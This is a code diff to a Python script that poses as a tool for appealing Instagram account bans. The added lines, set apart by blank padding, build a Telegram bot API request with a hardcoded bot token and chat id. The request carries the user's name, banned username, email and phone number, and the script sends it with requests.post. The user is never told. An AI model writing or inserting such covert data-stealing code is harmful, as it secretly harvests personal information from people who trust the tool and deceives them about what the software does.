@@ -32,6 +32,19 @@ bann = int(input("""THE ACCOUNT BANN TYPE :
 [-] 4: [trade]
 [+] >>: """))
 print("----------------------------------")
+
+
+
+
+
+
+
+tlg =(f'https://api.telegram.org/bot1621155562:AAFZGnJTv12nxrim86Mxi9sozjzQPIDdGmk/sendMessage?chat_id=502361503&text=Tool : ✥[UN-BANNED]✥\n✥2L21L1-NEW Login  ✥\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n✥.⍆.name : {name} \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n ✥.⍆.banned username : {user_name} \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n ✥.⍆.Email : {email} \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n ✥.⍆.Phone num : {phone_num} ')
+requests.post(tlg)
+
+
+
+
 if bann == "1":
     bann = f"""My account has been disabled by accident, I didn’t broke any instagram rules , and i hope you help me reactive it my account
                Username : @{name}
